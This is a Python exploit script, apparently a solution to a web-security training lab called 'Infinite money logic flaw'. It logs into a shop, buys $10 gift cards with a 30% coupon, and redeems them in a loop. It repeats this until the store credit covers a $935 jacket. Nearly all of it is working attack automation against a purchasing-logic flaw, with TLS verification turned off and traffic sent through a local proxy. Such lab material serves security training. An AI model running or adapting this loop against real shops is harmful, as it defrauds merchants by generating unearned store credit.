import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_csrf(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {'name' : 'csrf'})['value']
    return csrf_token

def apply_coupon(s, url):
    coupon_url = url + '/coupon'
    params = {
        'csrf' : get_csrf(s, url),
        'coupon' : 'SIGNUP30'
    }
    r = s.post(coupon_url, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] There was an error while applying the coupon")
        sys.exit(-1)
    #print("[+] Coupon applied!")


def do_place_order(s, url):
    checkout_url = url + '/checkout'
    params = {
        'csrf' : get_csrf(s, url)
    }
    r = s.post(checkout_url, data=params, verify=False, proxies=proxies)
    if "Your order is on its way" not in r.text:
        print("[-] Could not place the order!")
        sys.exit(-1)
    soup = BeautifulSoup(r.text, "html.parser")
    code_entry = soup.find_all("td")
    code = re.search(r"<td>([A-Z,a-z,0-9]{10})</td>", str(code_entry)).group(1)
    return code
    
def reedem_code(s, url, gift_code):
    account_url = url + "/my-account"
    reedem_code_url = url + '/gift-card'
    params = {
        'csrf' : get_csrf(s, account_url),
        'gift-card' : gift_code
    }
    r = s.post(reedem_code_url, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not reedem the code")
        sys.exit(-1)
    current_balance = re.search(r"Store credit: \$(\d+.\d+)", r.text).group(1)
    return current_balance


def purchase_gift(s, url):
    cart_url = url + '/cart'
    params = {
        'productId' : 2,
        'redir' : 'CART',
        'quantity' : 1
    }
    r = s.post(cart_url, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Error while adding gift card to shopping basket")
        sys.exit(-1)
    # APPLY COUPON
    apply_coupon(s, cart_url)

    # PURCHASE GIFT CARD
    gift_code = do_place_order(s, cart_url)

    # REEDEM CODE AND CHECK WALLET
    current_balance = reedem_code(s, url, gift_code)
    return float(current_balance)


def buy_jacket(s, url):
    # LOG-IN AS 'WIENER'
    login_url = url + '/login'
    params = {
        'csrf' : get_csrf(s, login_url),
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url, data=params, verify=False, proxies=proxies)
    # CHECK LOG-IN
    if "Log out" and "wiener" not in r.text:
        print("[-] Couldnot log-in!")
        sys.exit(-1)
    
    print("[+] Logged-in!")

    # ADD GIFT CARD AND GET CODE
    # CONTINUE UNTIL WALLET IS > $935.00
    print("[+] Here comes the magic... let's buying $10.00 gift cards using coupon 'SIGNUP30'")
    print("[+] meaning we pay each gift card $7.00 and reedem the code to gain $3.00 for free")
    print("[+] Let's continue to do so until we reach enough money to buy the jacket")
    current_balance = 0
    while current_balance < 935.00:
        current_balance = purchase_gift(s, url)
        sys.stdout.write("[+] Current balance is $%0.2f\r" % current_balance)
        sys.stdout.flush()
        sys.stdout.write("\033[K")
    print("\n[+] Exploit done! The wallet is now $%0.2f" % current_balance)
    print("[+] Now to add the jacket, apply the coupon and complete the purchase!")

    # ADD JACKET TO CART
    cart_url = url + '/cart'
    params = {
        'productId' : 1,
        'redir' : 'CART',
        'quantity' : 1
    }
    r = s.post(cart_url, data=params, verify=False, proxies=proxies)
    if r.status_code != 200:
        print("[-] Could not add the jacket to the shopping basket")
        sys.exit(-1)
    
    # APPLY COUPON
    apply_coupon(s, cart_url)

    # PURCHASE THE JACKET
    checkout_url = url + "/cart/checkout"
    params = {
        'csrf' : get_csrf(s, cart_url)
    }
    r = s.post(checkout_url, data=params, verify=False, proxies=proxies)
    if "Your order is on its way" not in r.text:
        print("[-] Error while buying the jacket")
        sys.exit(-1)
    print("[+] Complete! The jacket is all yours")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()

    url = sys.argv[1].strip()

    print("[+] Lab: Infinite money logic flaw")
    print("""This lab has a logic flaw in its purchasing workflow.
    To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".
    
    You can log in to your own account using the following credentials: wiener:peter""")

    buy_jacket(s, url)


if __name__ == "__main__":
    main()